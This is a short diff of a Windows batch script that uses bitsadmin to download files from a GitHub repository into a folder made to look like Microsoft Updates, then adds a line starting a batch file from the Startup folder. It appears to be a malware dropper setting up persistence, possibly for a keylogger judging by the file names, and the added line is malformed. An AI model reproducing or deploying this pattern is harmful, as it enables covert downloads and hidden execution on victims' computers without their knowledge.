@@ -8,4 +8,4 @@ bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/S
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"
 
-del startup.bat
+start AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat
